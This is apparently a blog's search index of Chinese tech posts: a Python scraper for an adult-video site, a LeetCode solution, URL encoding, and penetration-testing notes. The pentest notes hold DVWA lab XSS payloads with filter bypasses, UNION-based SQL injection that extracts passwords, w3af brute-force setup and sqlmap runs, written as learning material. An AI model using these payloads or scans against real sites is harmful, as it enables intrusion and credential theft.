<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[[Python]爬虫-爬取动态网页]]></title>
    <url>%2F2019%2F11%2F06%2FPython-%E7%88%AC%E8%99%AB-%E7%88%AC%E5%8F%96%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[动态网页的爬取 方法一:动态页面逆向分析爬取 假设网页为https://www.jxxxxs.com 1.分析返回的数据 2.在head中找到request Url 1https://www.jxxxxs.com/ajax/uncledatoolsbyajax.php?gid=41706222943&amp;lang=zh&amp;img=https://pics.jxxxxs.com/cover/7dts_b.jpg&amp;uc=0&amp;floor=58xx 3.在源码中找到request Url中参数的由来,构造request Url 12345&lt;script&gt; var gid = 41706222943; var uc = 0; var img = &apos;https://pics.jxxxxs.com/cover/7dts_b.jpg&apos;;&lt;/script&gt; 4.构造headers 直接访问request Url返回为空 网页采取了同源策略 因此headers应构造为: 12345headers = &#123; &quot;cookie&quot;: &quot;yourCookie&quot;, &quot;referer&quot;: url, &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36&quot; &#125; headers中的referer表示你是从哪个网页来到这个网页的 url因为当前这个网页即: 1https://www.jxxxxs.com 完整代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135import requestsimport timefrom bs4 import BeautifulSoupimport reimport MySQLdbdef getDesignation(url, start, end): url1 = url urlList = [] for i in range(start - 1, end): url = url1 + &quot;/page/&quot; + str(i) soup = getHtml(url) div = soup.find_all(&quot;a&quot;, class_=&quot;movie-box&quot;) for a in div: urlList.append(str(a[&apos;href&apos;])) return urlListdef getHtml(url): # proxies = &#123;&quot;http&quot;:&quot;127.0.0.1:7890&quot;,&quot;https&quot;:&quot;127.0.0.1:7890&quot;&#125; headers = &#123; &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36&quot;, &quot;Cookie&quot;: &quot;__cfduid=d48bd03c3af7e9f9d83f3e891fa11ac591572860346; PHPSESSID=hepauv3nr32pnmcludn1r6taa0; existmag=mag&quot;&#125; while True: # 一直循环直到访问成功 try: r = requests.get(url, headers=headers) soup = BeautifulSoup(r.text, &quot;lxml&quot;) return soup except requests.exceptions.ConnectionError: print(&apos;ConnectionError -- please wait 1 seconds&apos;) time.sleep(1) except requests.exceptions.HTTPError: print(&apos;HTTPError -- please wait 1 seconds&apos;) time.sleep(1) except requests.exceptions.Timeout: print(&apos;TimeoutError -- please wait 1 seconds&apos;) time.sleep(1) except: print(&apos;Unfortunitely -- An Unknow Error Happened, Please wait 1 seconds&apos;) time.sleep(1)def getDescribe(soup): result = soup.select(&quot;body &gt; .container &gt; h3&quot;)[0].get_text() return resultdef getId(soup): idCode = \ soup.select(&quot;body &gt; div.container &gt; div.row.movie &gt; div.col-md-3.info &gt; p:nth-child(1) &gt; span:nth-child(2)&quot;)[ 0].get_text() return idCodedef getIsData(soup): issueData = soup.select(&quot;body &gt; div.container &gt; div.row.movie &gt; div.col-md-3.info &gt; p:nth-child(2)&quot;)[0].get_text() issueData = issueData[6:] return issueDatadef getDuration(soup): duration = soup.select(&quot;body &gt; div.container &gt; div.row.movie &gt; div.col-md-3.info &gt; p:nth-child(3)&quot;)[0].get_text() reDu = re.compile(r&apos;[0-9]&#123;1,3&#125;&apos;) duration = reDu.search(duration).group() return int(duration)def getActor(soup): actor = soup.select(&quot;body &gt; div.container &gt; div.row.movie &gt; div.col-md-3.info &gt; p:last-child&quot;) if actor: return actor[0].get_text() return &quot;暂无&quot;def getMagent(soup, url): headers = &#123; &quot;cookie&quot;: &quot;__cfduid=d7c5d33dbb814b0a23dae4be2aac7c3e81573010426; PHPSESSID=ivnobghsmkl9314o8lfbe9aif4; existmag=mag&quot;, &quot;referer&quot;: url, &quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36&quot; &#125; ajaxUrl = &apos;https://www.javbus.com/ajax/uncledatoolsbyajax.php?lang=zh&apos; ajaxData = soup.select(&apos;script&apos;)[8].text for l in ajaxData.split(&apos;;&apos;)[:-1]: ajaxUrl += &apos;&amp;%s&apos; % l[7:].replace(&quot;&apos;&quot;, &quot;&quot;).replace(&apos; &apos;, &apos;&apos;) times = 0 while (times &lt; 3): try: report = requests.get(ajaxUrl, headers=headers) soupD = BeautifulSoup(report.text, &quot;lxml&quot;) times += 1 magentAll = soupD.find_all(&quot;a&quot;, title=&quot;滑鼠右鍵點擊並選擇【複製連結網址】&quot;, text=re.compile(r&apos;.*GB.*&apos;, re.DOTALL)) reGB = re.compile(&apos;\d+\W\d+&apos;) dic = &#123;&#125; for i in magentAll: dic[str(i[&apos;href&apos;])] = float(reGB.search(i.string).group()) dic = sorted(dic.items(), key=lambda x: x[1], reverse=True) return dic[0][0] except BaseException as e: print(e) time.sleep(1)def getImg(soup): img = soup.select(&quot;body &gt; div.container &gt; div.row.movie &gt; div.col-md-9.screencap &gt; a &gt; img&quot;)[0][&apos;src&apos;] return imgdef inputDB(url, soup): # 连接数据库 db = MySQLdb.connect(host=&apos;127.0.0.1&apos;, port=3306, user=&apos;root&apos;, password=&apos;root&apos;, db=&apos;javInfo&apos;, charset=&apos;utf8&apos;) cursor = db.cursor() id = getId(soup) describe = getDescribe(soup) issueData = getIsData(soup) duration = getDuration(soup) actor = getActor(soup) magent = getMagent(soup, url) img = getImg(soup); sql = &apos;INSERT INTO jav(识别码,描述,发行日期,时长,演员,链接,图片链接) VALUE (%s,%s,%s,%s,%s,%s,%s)&apos; value = (id, describe, issueData, duration, actor, magent, img) try: cursor.execute(sql, value) db.commit(); print(&quot;插入成功&quot;) except BaseException as e: db.rollback() print(e)if __name__ == &apos;__main__&apos;: for url in getDesignation(&quot;http://www.javbus.com&quot;, 1, 5): print(url) soup = getHtml(url) inputDB(url, soup) 方法二:Selenium 模拟登录 需要下载一个chromedriver.exe 基本的使用方法: 123from selenium import webdriverbrowser = webdriver.Chrome(chromedriver.exe所在的 路径)browser.get(yourUrl)]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[JavaLeetCode]4. 寻找两个有序数组的中位数]]></title>
    <url>%2F2019%2F10%2F28%2FavaLeetCode-4-%E5%AF%BB%E6%89%BE%E4%B8%A4%E4%B8%AA%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0%2F</url>
    <content type="text"><![CDATA[12345给定两个大小为 m 和 n 的有序数组 nums1 和 nums2。请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为 O(log(m + n))。你可以假设 nums1 和 nums2 不会同时为空。 123456789101112示例 1:nums1 = [1, 3]nums2 = [2]则中位数是 2.0示例 2:nums1 = [1, 2]nums2 = [3, 4]则中位数是 (2 + 3)/2 = 2.5 寻找第K小数 上边的两种思路，时间复杂度都达不到题目的要求 O(log(m+n)O(log(m+n)。看到 log，很明显，我们只有用到二分的方法才能达到。我们不妨用另一种思路，题目是求中位数，其实就是求第 k 小数的一种特殊情况，而求第 k 小数有一种算法。 解法二中，我们一次遍历就相当于去掉不可能是中位数的一个值，也就是一个一个排除。由于数列是有序的，其实我们完全可以一半儿一半儿的排除。假设我们要找第 k 小数，我们可以每次循环排除掉 k/2 个数。看下边一个例子。 假设我们要找第 7 小的数字。 我们比较两个数组的第 k/2 个数字，如果 k 是奇数，向下取整。也就是比较第 33 个数字，上边数组中的 44 和下边数组中的 33，如果哪个小，就表明该数组的前 k/2 个数字都不是第 k 小数字，所以可以排除。也就是 11，22，33 这三个数字不可能是第 77 小的数字，我们可以把它排除掉。将 13491349 和 4567891045678910 两个数组作为新的数组进行比较。 更一般的情况 A[1] ，A[2] ，A[3]，A[k/2] ... ，B[1]，B[2]，B[3]，B[k/2] ... ，如果 A[k/2]&lt;B[k/2] ，那么A[1]，A[2]，A[3]，A[k/2]都不可能是第 k 小的数字。 A 数组中比 A[k/2] 小的数有 k/2-1 个，B 数组中，B[k/2] 比 A[k/2] 小，假设 B[k/2] 前边的数字都比 A[k/2] 小，也只有 k/2-1 个，所以比 A[k/2] 小的数字最多有 k/1-1+k/2-1=k-2个，所以 A[k/2] 最多是第 k-1 小的数。而比 A[k/2] 小的数更不可能是第 k 小的数了，所以可以把它们排除。 橙色的部分表示已经去掉的数字。 由于我们已经排除掉了 3 个数字，就是这 3 个数字一定在最前边，所以在两个新数组中，我们只需要找第 7 - 3 = 4 小的数字就可以了，也就是 k = 4。此时两个数组，比较第 2 个数字，3 &lt; 5，所以我们可以把小的那个数组中的 1 ，3 排除掉了。 我们又排除掉 2 个数字，所以现在找第 4 - 2 = 2 小的数字就可以了。此时比较两个数组中的第 k / 2 = 1 个数，4 == 4，怎么办呢？由于两个数相等，所以我们无论去掉哪个数组中的都行，因为去掉 1 个总会保留 1 个的，所以没有影响。为了统一，我们就假设 4 &gt; 4 吧，所以此时将下边的 4 去掉。 由于又去掉 1 个数字，此时我们要找第 1 小的数字，所以只需判断两个数组中第一个数字哪个小就可以了，也就是 4。 所以第 7 小的数字是 4。 我们每次都是取 k/2 的数进行比较，有时候可能会遇到数组长度小于 k/2的时候。 此时 k / 2 等于 3，而上边的数组长度是 2，我们此时将箭头指向它的末尾就可以了。这样的话，由于 2 &lt; 3，所以就会导致上边的数组 1，2 都被排除。造成下边的情况。 由于 2 个元素被排除，所以此时 k = 5，又由于上边的数组已经空了，我们只需要返回下边的数组的第 5 个数字就可以了。 从上边可以看到，无论是找第奇数个还是第偶数个数字，对我们的算法并没有影响，而且在算法进行中，k 的值都有可能从奇数变为偶数，最终都会变为 1 或者由于一个数组空了，直接返回结果。 所以我们采用递归的思路，为了防止数组长度小于 k/2，所以每次比较 min(k/2，len(数组) 对应的数字，把小的那个对应的数组的数字排除，将两个新数组进入递归，并且 k 要减去排除的数字的个数。递归出口就是当 k=1 或者其中一个数字长度是 0 了。 123456789101112131415161718192021222324252627282930class Solution &#123; public double findMedianSortedArrays(int[] nums1, int[] nums2) &#123; int len1 = nums1.length; int len2 = nums2.length; int left = (len1 + len2 + 1)/2; int right = (len1 + len2 + 2)/2; return (getKth(nums1, 0, len1 - 1, nums2, 0, len2 - 1, left) + getKth(nums1, 0, len1 - 1, nums2, 0, len2 - 1, right)) * 0.5; &#125; private int getKth(int[] nums1,int start1, int end1, int[] nums2, int start2, int end2,int k) &#123; int len1 = end1- start1 +1; int len2 = end2- start2 +1; if(len1 &gt; len2) return getKth(nums2, start2, end2, nums1, start1, end1, k); if(len1 == 0) return nums2[start2 + k -1]; if(k == 1) return Math.min(nums1[start1],nums2[start2]); int i = start1 + Math.min(len1,k/2) - 1; int j = start2 + Math.min(len2,k/2) - 1; if(nums1[i] &gt; nums2[j]) return getKth(nums1,start1,end1,nums2,j+1,end2,k - (j - start2 +1)); else return getKth(nums1,i+1,end1,nums2,start2,end2,k - (i - start1 +1)); &#125;&#125; 时间复杂度：每进行一次循环，我们就减少 k/2 个元素，所以时间复杂度是 O(log(k)，而 k=(m+n)/2，所以最终的复杂也就是 O(log(m+n）O(log(m+n）。 空间复杂度：虽然我们用到了递归，但是可以看到这个递归属于尾递归，所以编译器不需要不停地堆栈，所以空间复杂度为 O(1)O(1)。 详细通俗的思路分析]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[Python]关于url中特殊字符的编码和解码]]></title>
    <url>%2F2019%2F10%2F09%2Fython%E5%85%B3%E4%BA%8Eurl%E4%B8%AD%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E8%A7%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[百度API请求中需要用到中文或一些特殊字符的参数，如query、region等，为了避免提交到后台乱码，需要对这几个参数值进行编码处理，转换成UTF-8字符的二字符十六进制值 编码 12from urllib.parse import quotetext = quote(text, &apos;utf-8&apos;) 解码 12from urllib.parse import unquotetext = unquote(text, &apos;utf-8&apos;) 实例 123456789101112131415161718192021import requestsfrom urllib import parse#地理编码address = &apos;杭州电子科技大学(高教园校区)&apos;url = &apos;http://api.map.baidu.com/geocoding/v3/?address=&apos; + address + &apos;&amp;output=json&amp;ak=myAK&amp;callback&apos;#对URL的保留字进行编码与解码url = parse.quote(url,&apos;utf-8&apos;)url = parse.unquote(url,&apos;utf-8&apos;)response = requests.get(url)answer = response.json()lng = answer[&apos;result&apos;][&apos;location&apos;][&apos;lng&apos;]lat = answer[&apos;result&apos;][&apos;location&apos;][&apos;lat&apos;]#逆地理编码re_url = &apos;http://api.map.baidu.com/reverse_geocoding/v3/?ak=myAK&amp;output=json&amp;coordtype=wgs84ll&amp;location=&apos; + str(lat) + &apos;,&apos; + str(lng)re_response = requests.get(re_url)re_answer = re_response.json()print(re_answer[&apos;result&apos;][&apos;formatted_address&apos;]) 输出 123浙江省杭州市江干区文溯路Process finished with exit code 0]]></content>
      <categories>
        <category>learn</category>
      </categories>
      <tags>
        <tag>Python网络编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]8.XSS]]></title>
    <url>%2F2019%2F09%2F04%2F%E9%80%8F%E5%AD%A6%E4%B9%A0-8-XSS%2F</url>
    <content type="text"><![CDATA[反射型XSS XSS 反射型XSS 1.DVWA安全级别为低时 源码为 123456789101112131415 &lt;?phpif(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;$isempty = true;&#125; else &#123; echo &apos;&lt;pre&gt;&apos;; echo &apos;Hello &apos; . $_GET[&apos;name&apos;]; echo &apos;&lt;/pre&gt;&apos;; &#125;?&gt; 输入 1&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; 2.DVWA安全级别为中时 源码为 123456789101112131415 &lt;?phpif(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;$isempty = true;&#125; else &#123; echo &apos;&lt;pre&gt;&apos;; echo &apos;Hello &apos; . str_replace(&apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[&apos;name&apos;]); echo &apos;&lt;/pre&gt;&apos;; &#125;?&gt; 只是将 1&lt;script&gt; 屏蔽了 1.大小写绕过 输入 1&lt;SCRIPT&gt;alert(&apos;ccc&apos;)&lt;/SCRIPT&gt; 2.双写绕过 输入 1&lt;scr&lt;script&gt;ipt&gt;alert(&apos;ccc&apos;)&lt;/scr&lt;script&gt;ipt&gt; 3.避开被过滤的符号，转换脚本样式 输入 1&lt;img src=&quot;https://www.baidu.com&quot; onmouseover=prompt(document.cookie) /&gt; onmouseover 事件会在鼠标指针移动到指定的对象上时发生 prompt() 方法用于显示可提示用户进行输入的对话框 或者输入 1&lt;input onfocus=&quot;javascript:alert(document.cookie)&quot; /&gt; onfocus 事件在对象获得焦点时发生 3.DVWA安全级别为高时 源码为 123456789101112131415 &lt;?php if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123; $isempty = true; &#125; else &#123; echo &apos;&lt;pre&gt;&apos;; echo &apos;Hello &apos; . htmlspecialchars($_GET[&apos;name&apos;]); echo &apos;&lt;/pre&gt;&apos;; &#125;?&gt; htmlspecialchars的作用 1234567htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。预定义的字符是：&amp; （和号）成为 &amp;&quot; （双引号）成为 &quot;&apos; （单引号）成为 &apos;&lt; （小于）成为 &lt;&gt; （大于）成为 &gt; 也就是说输入 1&lt;script&gt; 就会输出 1&lt;script&gt; 而不是将其作为脚本 没办法 参考资料:DVWA之跨站脚本攻击漏洞测试01-反射型XSS]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]7.Sql注入]]></title>
    <url>%2F2019%2F09%2F03%2F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[基本的Sql注入过程 Sql注入 先将DVWA的安全防护等级调为ｌｏｗ 1. 输入' or 1=1 -- ' '--'表示sql中的注释符 2. 输入' union select 1,2 -- ' 可知数据表有两列 3. 输入' union select 1, column_name from INFORMATION_SCHEMA.tables -- ' 查询INFORMATION_SCHEMA系统表 4. 输入' union select 1, column_name from INFORMATION_SCHEMA.columns where table_name = 'users' -- ' 5. 输入' union select null, password from users -- ' 得到密码的md5值 6. 输入' union select password, concat(first_name, ' ', last_name, ' ',user) from users -- ']]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>Sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[渗透学习]6.Web应用渗透技术]]></title>
    <url>%2F2019%2F08%2F06%2F%E9%80%8F%E5%AD%A6%E4%B9%A0-6-Web%E5%BA%94%E7%94%A8%E6%B8%97%E9%80%8F%E6%8A%80%E6%9C%AF%2F</url>
    <content type="text"><![CDATA[安装W3AF kali linux（全版本）详细安装w3af指南（文内提供成品镜像下载） 或者 kali linux 2018.1版下安装w3af 【超详细】 1. W3AF命令行配置及扫描 命令行基本配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211# root @ K in /usr/local/src/w3af on git:master x [14:13:57] $ ./w3af_consolew3af&gt;&gt;&gt; help|-----------------------------------------------------------------------------------------------------------------------------------|| start | Start the scan. || plugins | Enable and configure plugins. || exploit | Exploit the vulnerability. || profiles | List and use scan profiles. || cleanup | Cleanup before starting a new scan. ||-----------------------------------------------------------------------------------------------------------------------------------|| help | Display help. Issuing: help [command] , prints more specific help about &quot;command&quot; || version | Show w3af version information. || keys | Display key shortcuts. ||-----------------------------------------------------------------------------------------------------------------------------------|| http-settings | Configure the HTTP settings of the framework. || misc-settings | Configure w3af misc settings. || target | Configure the target URL. ||-----------------------------------------------------------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------------------------------------------------------|| kb | Browse the vulnerabilities stored in the Knowledge Base ||-----------------------------------------------------------------------------------------------------------------------------------|w3af&gt;&gt;&gt; pluginsw3af/plugins&gt;&gt;&gt; help|-----------------------------------------------------------------------------------------------------------------------------------|| list | List available plugins. ||-----------------------------------------------------------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------------------------------------------------------|| output | View, configure and enable output plugins || audit | View, configure and enable audit plugins || auth | View, configure and enable auth plugins || crawl | View, configure and enable crawl plugins || mangle | View, configure and enable mangle plugins || infrastructure | View, configure and enable infrastructure plugins || evasion | View, configure and enable evasion plugins || grep | View, configure and enable grep plugins || bruteforce | View, configure and enable bruteforce plugins ||-----------------------------------------------------------------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; bruteforce|----------------------------------------------------------------------------------------------------------------------------------|| Plugin name | Status | Conf | Description ||----------------------------------------------------------------------------------------------------------------------------------|| basic_auth | | Yes | Bruteforce HTTP basic authentication. || form_auth | | Yes | Bruteforce HTML form authentication. ||----------------------------------------------------------------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; bruteforce config form_authw3af/plugins/bruteforce/config:form_auth&gt;&gt;&gt; help|-----------------------------------------------------------------------------------------------------------------------------------|| view | List the available options and their values. || set | Set a parameter value. || save | Save the configured settings. ||-----------------------------------------------------------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------------------------------------------------------|w3af/plugins/bruteforce/config:form_auth&gt;&gt;&gt; view|----------------------------------------------------------------------------------------------------------------------------------|| Setting | Value | Modified | Description ||----------------------------------------------------------------------------------------------------------------------------------|| users_file | w3af/core/controllers/bruteforce/users.txt | | Users file to use in bruteforcing || use_profiling | True | | This indicates if the bruteforce should use || | | | password profiling to collect new passwords. || use_emails | True | | This indicates if the bruteforcer should use || | | | emails collected by w3af plugins as users. || combo_file | w3af/core/controllers/bruteforce/combo.txt | | Combo of username and password, file to use || | | | in bruteforcing || pass_eq_user | True | | This indicates if the bruteforce should try || | | | password equal user in logins. || combo_separator | : | | Separator string used in Combo file to split || | | | username and password || passwd_file | w3af/core/controllers/bruteforce/passwords.txt | | Passwords file to use in bruteforcing || stop_on_first | True | | This indicates if the bruteforce should stop || | | | after finding the first correct user and || | | | password. || profiling_number | 50 | | This indicates how many passwords from || | | | profiling will be used. || use_svn_users | True | | This indicates if we will use usernames from || | | | SVN headers collected by w3af plugins in || | | | bruteforce. || mask_password_report | False | | Mask valid passwords found via brute-force || | | | with * when writing to report || use_leet_password | True | | This indicates if the bruteforce should try || | | | l337 passwords ||----------------------------------------------------------------------------------------------------------------------------------|w3af/plugins/bruteforce/config:form_auth&gt;&gt;&gt; set passwd_file w3af/core/controllers/bruteforce/passwords.txtw3af/plugins/bruteforce/config:form_auth&gt;&gt;&gt; backThe configuration has been saved.w3af/plugins&gt;&gt;&gt; audit xss,sqli&apos;w3af/plugins&gt;&gt;&gt; crawl genexus_xml wordpress_fingerprint dot_listing content_negotiation robots_txt archive_dot_org ria_enumerator wordnet user_dir sitemap_xml bing_spider dir_file_bruter phpinfo find_dvcs import_results payment_webhook_finder google_spider url_fuzzer urllist_txt find_backdoors web_spider spider_man find_captchas oracle_discovery wsdl_finder wordpress_enumerate_users web_diff dwsync_xml pykto wordpress_fullpathdisclosure phishtank digit_sum open_api dot_ds_store ghdb all config desc w3af/plugins&gt;&gt;&gt; crawl web_spiderw3af/plugins&gt;&gt;&gt; crawl config web_spiderw3af/plugins/crawl/config:web_spider&gt;&gt;&gt; help|-----------------------------------------------------------------------------------------------------------------------------------|| view | List the available options and their values. || set | Set a parameter value. || save | Save the configured settings. ||-----------------------------------------------------------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------------------------------------------------------|w3af/plugins/crawl/config:web_spider&gt;&gt;&gt; view|----------------------------------------------------------------------------------------------------------------------------------|| Setting | Value | Modified | Description ||----------------------------------------------------------------------------------------------------------------------------------|| only_forward | False | | Only crawl links to paths inside the URL given as target. || ignore_extensions | | | DO NOT crawl links that use these extensions. || ignore_regex | | | DO NOT crawl links that match this regular expression. Note that ignore_regex has || | | | precedence over follow_regex. || follow_regex | .* | | Only crawl links that match this regular expression. Note that ignore_regex has || | | | precedence over follow_regex. ||----------------------------------------------------------------------------------------------------------------------------------|w3af/plugins/crawl/config:web_spider&gt;&gt;&gt; set only_forward Truew3af/plugins/crawl/config:web_spider&gt;&gt;&gt; backThe configuration has been saved.w3af/plugins&gt;&gt;&gt; backw3af&gt;&gt;&gt; help|-----------------------------------------------------------------------------------------------------------------------------------|| start | Start the scan. || plugins | Enable and configure plugins. || exploit | Exploit the vulnerability. || profiles | List and use scan profiles. || cleanup | Cleanup before starting a new scan. ||-----------------------------------------------------------------------------------------------------------------------------------|| help | Display help. Issuing: help [command] , prints more specific help about &quot;command&quot; || version | Show w3af version information. || keys | Display key shortcuts. ||-----------------------------------------------------------------------------------------------------------------------------------|| http-settings | Configure the HTTP settings of the framework. || misc-settings | Configure w3af misc settings. || target | Configure the target URL. ||-----------------------------------------------------------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------------------------------------------------------|| kb | Browse the vulnerabilities stored in the Knowledge Base ||-----------------------------------------------------------------------------------------------------------------------------------|w3af&gt;&gt;&gt; targetw3af/config:target&gt;&gt;&gt; set target http://www.dvssc.com/dvwa/index.phpw3af/config:target&gt;&gt;&gt; backThe configuration has been saved.w3af&gt;&gt;&gt; pluginsw3af/plugins&gt;&gt;&gt; help |-----------------------------------------------------------------------------------------------------------------------------------|| list | List available plugins. ||-----------------------------------------------------------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------------------------------------------------------|| output | View, configure and enable output plugins || audit | View, configure and enable audit plugins || auth | View, configure and enable auth plugins || crawl | View, configure and enable crawl plugins || mangle | View, configure and enable mangle plugins || infrastructure | View, configure and enable infrastructure plugins || evasion | View, configure and enable evasion plugins || grep | View, configure and enable grep plugins || bruteforce | View, configure and enable bruteforce plugins ||-----------------------------------------------------------------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; output |----------------------------------------------------------------------------------------------------------------------------------|| Plugin name | Status | Conf | Description ||----------------------------------------------------------------------------------------------------------------------------------|| console | Enabled | Yes | Print messages to the console. || csv_file | | Yes | Export identified vulnerabilities to a CSV file. || email_report | | Yes | Email report to specified addresses. || export_requests | | Yes | Export the fuzzable requests found during crawl to a file. || html_file | | Yes | Generate HTML report with identified vulnerabilities and log messages. || json_file | | Yes | Export identified vulnerabilities to a JSON file. || system_log | | Yes | Write log entries to Linux&apos;s syslog || text_file | | Yes | Prints all messages to a text file. || xml_file | | Yes | Print all messages to a xml file. ||----------------------------------------------------------------------------------------------------------------------------------|w3af/plugins&gt;&gt;&gt; output html_filew3af/plugins&gt;&gt;&gt; output config html_filew3af/plugins/output/config:html_file&gt;&gt;&gt; help|-----------------------------------------------------------------------------------------------------------------------------------|| view | List the available options and their values. || set | Set a parameter value. || save | Save the configured settings. ||-----------------------------------------------------------------------------------------------------------------------------------|| back | Go to the previous menu. || exit | Exit w3af. ||-----------------------------------------------------------------------------------------------------------------------------------|w3af/plugins/output/config:html_file&gt;&gt;&gt; view|----------------------------------------------------------------------------------------------------------------------------------|| Setting | Value | Modified | Description ||----------------------------------------------------------------------------------------------------------------------------------|| output_file | /root/report.html | | File name where this plugin will write to || verbose | False | | True if debug information will be appended to || | | | the report. || template | w3af/plugins/output/html_file/templates/complete.html | | The path to the HTML template used to render || | | | the report. ||----------------------------------------------------------------------------------------------------------------------------------|w3af/plugins/output/config:html_file&gt;&gt;&gt; set verbose Truew3af/plugins/output/config:html_file&gt;&gt;&gt; set output_file testDvssc.htmlw3af/plugins/output/config:html_file&gt;&gt;&gt; backThe configuration has been saved.w3af/plugins&gt;&gt;&gt; backw3af&gt;&gt;&gt; startEnabling form_auth&apos;s dependency password_profilingEnabling form_auth&apos;s dependency get_emailsEnabling form_auth&apos;s dependency http_auth_detectEnabling password_profiling&apos;s dependency langThe page is written in: &quot;fr&quot;....The sent post-data was: &quot;username=a%27b%22c%27d%22&amp;Login=Login&amp;password=FrAmE30.&quot; which modifies the &quot;username&quot; parameter. This vulnerability was found in the request with id 30.... 结果 2. sqlmap注入漏洞探测 使用Firefox的Tamper Data插件拿到需要的数据 sqlmap 123456789101112131415161718192021222324252627 # root @ K in ~ [15:43:09] $ sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&quot; --cookie=&apos;security=low; PHPSESSID=34r306k8id6f2tngn83duu81i5&apos; [*] starting @ 15:43:28 /2019-08-08/ ... sqlmap identified the following injection point(s) with a total of 112 HTTP(s) requests: ---Parameter: id (GET) Type: error-based Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id=aa&apos; AND (SELECT 8942 FROM(SELECT COUNT(*),CONCAT(0x7170626b71,(SELECT (ELT(8942=8942,1))),0x716a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &apos;cmKr&apos;=&apos;cmKr&amp;Submit=Submit Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: id=aa&apos; AND (SELECT 7299 FROM (SELECT(SLEEP(5)))AwTg) AND &apos;eRvX&apos;=&apos;eRvX&amp;Submit=Submit Type: UNION query Title: Generic UNION query (NULL) - 2 columns Payload: id=aa&apos; UNION ALL SELECT NULL,CONCAT(0x7170626b71,0x6c6b764d6a69444e4b416b5 36a6763465942666b744b694d4e41755763464f7778766d486 26d6475,0x716a716a71)-- BkBB&amp;Submit=Submit --- [15:44:08] [INFO] the back-end DBMS is MySQL web server operating system: Linux Ubuntu 10.04 (Lucid Lynx) web application technology: PHP 5.3.2, Apache 2.2.14 back-end DBMS: MySQL &gt;= 5.0 [15:44:08] [INFO] fetched data logged to text files under &apos;/root/.sqlmap/output/www.dvssc.com&apos; [*] ending @ 15:44:08 /2019-08-08/ 探测数据库名 1234567891011 # root @ K in ~ [15:44:50] $ sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=aa&amp;Submit=Submit#&quot; --cookie=&apos;security=low; PHPSESSID=34r306k8id6f2tngn83duu81i5&apos; --dbs -v 0 ... web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)web application technology: PHP 5.3.2, Apache 2.2.14back-end DBMS: MySQL &gt;= 5.0available databases [2]:[*] dvwa[*] information_schema [*] ending @ 15:54:32 /2019-08-08/ 探测数据库中的表名 12345678910111213 # root @ 